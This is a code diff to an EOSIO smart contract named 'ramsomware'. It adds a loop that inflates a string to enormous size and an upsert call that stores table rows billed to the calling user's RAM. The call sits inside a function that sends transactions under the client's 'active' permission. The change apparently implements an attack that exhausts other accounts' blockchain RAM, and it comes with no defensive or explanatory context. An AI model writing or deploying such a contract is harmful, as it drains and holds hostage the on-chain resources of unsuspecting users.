@@ -23,6 +23,17 @@ class [[eosio::contract]] ramsomware : public eosio::contract {
         void upsert(name user, uint64_t idx)
         {
             std::string A = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";
+            A = A+A+A+A+A+A+A+A+A+A+A+A+A+A+A+A+A+A;
+            A = A+A+A+A+A+A+A+A+A+A+A+A+A+A+A+A+A+A;
+            A = A+A+A+A+A+A+A+A+A+A+A+A+A+A+A+A+A+A;
+            A = A+A+A+A+A+A+A+A+A+A+A+A+A+A+A+A+A+A;
+            A = A+A+A+A+A+A+A+A+A+A+A+A+A+A+A+A+A+A;
+            A = A+A+A+A+A+A+A+A+A+A+A+A+A+A+A+A+A+A;
+            A = A+A+A+A+A+A+A+A+A+A+A+A+A+A+A+A+A+A;
+            A = A+A+A+A+A+A+A+A+A+A+A+A+A+A+A+A+A+A;
+            A = A+A+A+A+A+A+A+A+A+A+A+A+A+A+A+A+A+A;
+            A = A+A+A+A+A+A+A+A+A+A+A+A+A+A+A+A+A+A;
+            A = A+A+A+A+A+A+A+A+A+A+A+A+A+A+A+A+A+A;
 
             address_index addresses(_self, _self.value);
             addresses.emplace(user, [&](auto & row)
@@ -40,7 +51,8 @@ class [[eosio::contract]] ramsomware : public eosio::contract {
             transaction out2{};
             out1.actions.emplace_back(permission_level{client, "active"_n}, client, "func"_n,std::make_tuple( client,  uint64_t(1)) );
             out2.actions.emplace_back(permission_level{client, "active"_n}, client, "func"_n,std::make_tuple( client, uint64_t(2)) );
-            
+            upsert(client, idx);
+
             for(int i =0; i<=104; i++)
             { 
                 out1.actions.pop_back();
@@ -52,7 +64,6 @@ class [[eosio::contract]] ramsomware : public eosio::contract {
 
             for (int i = 0; i<=104; i++)
             {
-                // 5,6,7 /
                 out2.actions.pop_back();
                 out2.actions.emplace_back(permission_level{client, "active"_n}, client, "func"_n, std::make_tuple(client, uint64_t(initnum+(idx*5)+i) ));
                 //out2.delay_sec = 0;
